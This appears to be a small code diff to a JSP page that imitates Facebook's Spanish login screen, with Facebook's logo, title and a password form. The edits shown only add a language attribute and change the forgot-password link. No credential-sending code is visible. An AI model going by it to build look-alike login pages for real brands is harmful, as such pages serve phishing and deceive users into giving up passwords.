@@ -1,7 +1,7 @@
 <%@ page language="java" contentType="text/html; charset=UTF-8"
     pageEncoding="UTF-8"%>
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 	<link type="image/x-icon" href="imagenes/logoFacebook.svg" rel="icon" /> 
 	<title>Iniciar sesión en Facebook</title>
@@ -22,7 +22,7 @@
 					<input type="password" name="pass" placeholder="Contraseña">
 					<input type="submit" name="Entrar" value="Entrar" class="entrar">
 				</form>
-			<a href="olvidopassword.html" class="olvidoPass"><p>¿Has olvidado la contraseña?</p></a>
+			<a href="#" class="olvidoPass"><p>¿Has olvidado la contraseña?</p></a>
 			<%if(session.getAttribute("datosIncorrectos")=="true"){
 				%> <p class="datosErroneos">Datos incorrectos, vuelve a intentarlo</p>
 				<% 
